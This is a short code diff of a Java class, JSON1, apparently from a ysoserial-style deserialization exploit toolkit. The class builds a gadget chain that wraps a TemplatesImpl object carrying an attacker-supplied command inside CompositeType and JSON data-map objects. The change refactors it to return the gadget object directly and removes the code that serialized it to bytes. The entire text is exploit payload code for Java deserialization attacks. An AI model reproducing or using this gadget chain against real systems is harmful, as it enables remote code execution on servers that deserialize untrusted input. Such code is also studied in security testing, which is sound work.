@@ -16,7 +16,7 @@ import java.util.Map;
 
 public class JSON1 implements ObjectPayload<Object>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         Object tql    = Gadgets.createTemplatesImpl(type, param);
         Class  ifaces = Templates.class;
         CompositeType rt = new CompositeType("a", "b",
@@ -46,19 +46,6 @@ public class JSON1 implements ObjectPayload<Object>{
         Reflections.setFieldValue(jo, "properties", m);
         Reflections.setFieldValue(t1, "dataMap", jo);
         Reflections.setFieldValue(t2, "dataMap", jo);
-
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(Gadgets.makeMap(t1, t2));
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return Gadgets.makeMap(t1, t2);
     }
 }
